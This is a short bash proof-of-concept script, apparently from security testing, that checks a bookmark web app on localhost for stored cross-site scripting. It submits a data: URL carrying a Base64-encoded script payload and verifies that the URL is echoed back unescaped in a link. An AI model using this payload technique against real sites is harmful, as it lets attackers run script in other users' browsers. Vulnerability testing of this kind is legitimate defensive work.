#!/bin/bash

# Stored XSS POC: data: URL with Base64 encoded JavaScript
# This test verifies that the application is vulnerable to XSS via data: URLs

COOKIES="/tmp/xss_data_url.txt"
rm -f "$COOKIES"

echo "[*] Stored XSS via data: URL (Base64 encoded payload)"
echo "[*] =================================================="

echo "[*] Step 1: Initialize session"
curl -c "$COOKIES" "http://localhost:5000/list" -s > /dev/null

# Base64 of: <script>alert('XSS via data URL')</script>
B64_PAYLOAD="PHNjcmlwdD5hbGVydCgnWFNTIHZpYSBkYXRhIFVSTCcpPC9zY3JpcHQ+"
MALICIOUS_URL="data:text/html;base64,$B64_PAYLOAD"

echo "[*] Step 2: Add bookmark with data: URL (Base64 encoded JavaScript)"
curl -b "$COOKIES" -c "$COOKIES" -X POST "http://localhost:5000/add" \
  -d "name=XSSDataURL&url=$MALICIOUS_URL" -s > /dev/null

echo "[*] Step 3: Retrieve list and verify data: URL is unescaped"
RESPONSE=$(curl -b "$COOKIES" "http://localhost:5000/list" -s)

# Check if the data: URL appears unescaped in href attribute
if echo "$RESPONSE" | grep -q "href=\"data:text/html;base64,"; then
    echo "[+] STORED XSS CONFIRMED: data: URL found unescaped in href attribute"
    echo "[+] Malicious URL: $MALICIOUS_URL"
    echo "[+] Clicking this link will execute the embedded JavaScript"
    echo "[+] Vulnerable HTML:"
    echo "$RESPONSE" | grep "data:text/html;base64" | head -1
    exit 0
else
    echo "[-] XSS not found in expected form"
    exit 1
fi
